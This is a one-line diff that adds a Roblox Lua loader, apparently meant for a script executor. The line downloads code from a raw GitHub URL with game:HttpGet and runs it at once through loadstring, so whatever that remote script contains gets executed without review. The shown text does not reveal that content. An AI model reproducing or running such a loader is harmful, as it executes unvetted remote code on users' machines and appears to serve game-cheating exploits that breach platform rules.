@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RathaTepmanuth10/Kj-script-/main/Kj"))()
